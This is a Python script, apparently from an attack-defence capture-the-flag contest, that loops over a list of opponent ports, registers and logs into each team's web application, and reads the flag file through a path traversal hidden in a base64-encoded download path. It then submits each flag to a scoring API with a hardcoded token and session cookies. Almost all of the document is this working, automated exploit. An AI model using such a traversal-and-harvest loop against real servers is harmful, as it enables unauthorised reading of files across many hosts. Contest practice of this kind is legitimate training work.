# -*- coding: utf-8 -*-

import requests
import re,time
import os
# flag_name=str(times.tm_hour)+str(times.tm_min)+'flag.txt'
# flag_name='flag.txt'
flags=[]

def get_ip():
    ip_list=[]
    f=open("port.txt",'r')
    while 1:
        line = f.readline()
        if line != "":
            ip_list.append(line.strip())
        if not line:
            break
    f.close()
    return ip_list

# 遍历ip列表获取flag
def get_flag(ip):
    # pattern = re.compile(r'flag\{.*\}')
    session = requests.Session()

    # response = session.get("http://117.136.139.102:181"+i+"/album/download/path/Li4vLi4vLi4vLi4vLi4vLi4vZmxhZw==", headers=headers, cookies=cookies)
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    try:
        paramsPost = {"isajax":"1","userpass":"aaaaaa","mobile":"13977677777","nickname":"aaa","agree":"agree","email":"aaaa@aaaa.com","username":"aaa"}
        headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":"http://117.136.139.102:18129/user/register","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","DNT":"1","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
        cookies = {"MEIU_AUTH":"c632lKv%2BO9eD2e6s94ac%2BGoDdNI7QSM4Enp2wHDjR%2FjSCRI%2F94uJQ9bOppftHy%2BbzF7b0ohUTHcrj5ZFc5TG7X4ltx8","PHPSESSID":"5asb3r5mcjukpioptv78bm57aq","session":"ab246fd0-a3e4-44fb-b6ad-b86a4be30390"}
        response = session.post("http://117.136.139.102:181"+i+"/user/register", data=paramsPost, headers=headers, cookies=cookies,timeout=3)
        
        paramsPost = {"redirect":"","remember":"1","isajax":"1","userpass":"aaaaaa","username":"aaa"}
        headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":"http://117.136.139.102:18129/user/login","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","DNT":"1","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
        cookies = {"session":"ab246fd0-a3e4-44fb-b6ad-b86a4be30390","PHPSESSID":"5asb3r5mcjukpioptv78bm57aq"}
        response = session.post("http://117.136.139.102:181"+i+"/user/login/a/dologin", data=paramsPost, headers=headers, cookies=cookies,timeout=3)

        headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","DNT":"1"}
        cookies = {"MEIU_AUTH":"c632lKv%2BO9eD2e6s94ac%2BGoDdNI7QSM4Enp2wHDjR%2FjSCRI%2F94uJQ9bOppftHy%2BbzF7b0ohUTHcrj5ZFc5TG7X4ltx8","PHPSESSID":"5asb3r5mcjukpioptv78bm57aq","session":"ab246fd0-a3e4-44fb-b6ad-b86a4be30390"}
        response = session.get("http://117.136.139.102:181"+i+"/album/download/path/Li4vLi4vLi4vLi4vLi4vLi4vZmxhZw==", headers=headers, cookies=cookies,timeout=3)
        flag=response.content

    except:
        flag=""
    return flag
        # if flag not in flags and flag not in old_flag() and flag !="" and flag != None:
        #     flags.append(flag)
        # print flags
        # print '\n'


# 提交flag,视情况修改
def submit_flag(flag):
    session = requests.Session()
    rawBody = "{\"token\":\"sBzVpXLGsyhbadevqqQniqB1RXrB0mpMhq5e0VBi\",\"flag\":\""+flag+"\"}"
    # print rawBody
    headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":"http://117.136.139.102:16080/index","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","DNT":"1","Content-Type":"application/json;charset=utf-8"}
    cookies = {"MEIU_AUTH":"c632lKv%2BO9eD2e6s94ac%2BGoDdNI7QSM4Enp2wHDjR%2FjSCRI%2F94uJQ9bOppftHy%2BbzF7b0ohUTHcrj5ZFc5TG7X4ltx8","session":"ab246fd0-a3e4-44fb-b6ad-b86a4be30390"}
    response = session.post("http://117.136.139.102:16080/api/submit-flag", data=rawBody, headers=headers, cookies=cookies,timeout=3)
    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if response.status_code==200 and "Accepted" in response.content:
        print "Submit flag success " + flag
    else:
        print "submit flag failed: " + flag


if __name__ == '__main__':
    while True:
        for i in get_ip():
            try:
                flag=get_flag(i)
                if flag:
                    # print flag[-32:]
                # time.sleep(10)
                    submit_flag(flag[-32:])
                    with open('flag_web.txt','a') as f:
                            f.write(i+":"+flag+'\n')
                time.sleep(2)
            except:
                pass